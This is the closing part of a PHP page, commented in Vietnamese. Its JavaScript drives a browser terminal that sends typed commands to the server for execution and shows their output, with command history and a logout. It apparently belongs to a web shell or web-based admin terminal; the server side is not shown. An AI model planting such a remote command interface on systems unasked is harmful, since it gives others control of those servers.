                    const cls = isError ? 'term-error' : 'term-out';
                    html += `\n<span class="${cls}">${escHtml(output)}</span>`;
                }
                line.innerHTML = html;
                outputEl.appendChild(line);
                outputEl.scrollTop = outputEl.scrollHeight;
            }

            function appendSpinner(promptText, cmd) {
                const line = document.createElement('div');
                line.className = 'term-line';
                line.id = 'running-line';
                line.innerHTML = `<span class="term-prompt">${escHtml(promptText)}</span> <span class="term-cmd">${escHtml(cmd)}</span>\n<span class="term-out"><span class="spinner"></span>Đang thực thi...</span>`;
                outputEl.appendChild(line);
                outputEl.scrollTop = outputEl.scrollHeight;
                return line;
            }

            function escHtml(s) {
                if (s == null) return '';
                return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            }

            function runCommand() {
                if (is_running) return;
                const cmd = inputEl.value.trim();
                if (!cmd) return;

                // Lịch sử
                if (history_cmds[history_cmds.length - 1] !== cmd) history_cmds.push(cmd);
                history_idx = history_cmds.length;
                inputEl.value = '';

                const promptSnap = promptEl.textContent;
                is_running = true;
                runBtn.disabled = true;
                inputEl.disabled = true;

                // Xử lý lệnh clear/cls
                if (cmd === 'clear' || cmd === 'cls') {
                    clearTerminal();
                    is_running = false;
                    runBtn.disabled = false;
                    inputEl.disabled = false;
                    inputEl.focus();
                    return;
                }
                if (cmd === 'exit' || cmd === 'logout') {
                    document.querySelector('form[method=POST]').submit();
                    return;
                }

                const spinner = appendSpinner(promptSnap, cmd);

                fetch(window.location.href, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: new URLSearchParams({
                            action: 'exec',
                            cmd: cmd,
                            token: CSRF_TOKEN
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        spinner.remove();
                        if (data.error) {
                            appendLine(promptSnap, cmd, data.error, true);
                        } else {
                            appendLine(promptSnap, cmd, data.output, false);
                        }
                        if (data.cwd) updatePrompt(data.cwd);
                    })
                    .catch(err => {
                        spinner.remove();
                        appendLine(promptSnap, cmd, '[Lỗi kết nối] ' + err.message, true);
                    })
                    .finally(() => {
                        is_running = false;
                        runBtn.disabled = false;
                        inputEl.disabled = false;
                        inputEl.focus();
                    });
            }

            // Xử lý phím
            inputEl.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    runCommand();
                    return;
                }
                if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    if (history_idx > 0) {
                        history_idx--;
                        inputEl.value = history_cmds[history_idx] || '';
                    }
                }
                if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    if (history_idx < history_cmds.length - 1) {
                        history_idx++;
                        inputEl.value = history_cmds[history_idx] || '';
                    } else {
                        history_idx = history_cmds.length;
                        inputEl.value = '';
                    }
                }
                if (e.key === 'l' && e.ctrlKey) {
                    e.preventDefault();
                    clearTerminal();
                }
            });

            // Focus input khi click terminal
            outputEl.addEventListener('click', () => inputEl.focus());
            inputEl.focus();
        </script>
    <?php endif; ?>
</body>

</html>